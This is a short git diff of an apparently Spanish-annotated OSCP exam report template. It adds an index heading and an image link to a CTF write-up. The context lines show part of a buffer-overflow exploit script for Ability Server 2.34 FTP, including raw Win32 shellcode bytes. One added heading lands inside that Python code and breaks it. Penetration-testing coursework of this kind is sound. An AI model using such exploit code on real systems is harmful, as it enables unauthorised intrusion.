@@ -15,6 +15,12 @@ book: true
 classoption: oneside
 code-block-font-size: \\scriptsize
 ---
+
+## Índice y Estructura Principal
+- [Antecedentes - Experiencia Personal](#Antecedentes)
+
+<div style="text-align:center"><img src="https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BEEP/images/1.PNG" /></div>
+
 # Offensive-Security OSCP Exam Report
 
 ## Introduction
@@ -140,6 +146,8 @@ print "\\nAbility Server 2.34 FTP STOR buffer Overflow"
 print "\\nFor Educational Purposes Only!\\n"
 print "###################################"
 
+antecedentes
+==========================
 # Shellcode taken from Sergio Alvarez's "Win32 Stack Buffer Overflow Tutorial"
 
 sc = "\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x31\\xc9\\xb1\\x5e\\x81\\x73\\x17\\xe0\\x66"
